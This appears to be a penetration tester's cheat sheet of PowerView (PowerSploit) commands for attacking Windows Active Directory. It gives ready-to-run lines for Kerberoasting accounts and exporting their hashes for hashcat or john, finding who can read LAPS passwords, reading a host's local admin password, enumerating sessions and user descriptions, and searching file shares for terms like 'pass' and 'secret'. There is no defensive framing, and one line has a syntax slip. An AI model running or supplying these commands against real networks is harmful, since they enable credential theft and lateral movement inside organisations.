# source
https://raw.githubusercontent.com/AdrianVollmer/PowerSploit/master/Recon/PowerView.ps1

# kerberoast
Invoke-Kerberoast -OutputFormat [hashcat|john]> | % { $_.Hash } | Out-File -Encoding utf8 <file>

# get remote logged in user
Get-NetSession -ComputerName <fqdnRhost>

# get all users that can read the LAPS password of a specific host
Get-NetComputer -ComputerName '<fqdnRhost>' -FullData | Select-Object -ExpandProperty distinguishedname | ForEach-Object { $_.substring($_.indexof('OU')) } | ForEach-Object { Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_ } | Where-Object { ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {Convert-NameToSid $_.IdentityReference} | Select-Object -ExpandProperty SID | Get-ADObject

# read LAPS password for single host
$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
Get-DomainObject <fqdnRhost> -Credential $Cred -Properties "ms-mcs-AdmPwd",name

# get object descriptions
Get-NetUser | select-object samaccountname,description | fl | Out-File <file>.txt

# find interesting files on readable share
Invoke-FileFinder -IncludeC -IncludeAdmin -Terms pass,admin,secret,tomcat,login -OfficeDocs -Verbose -OutFile filefinder.csv

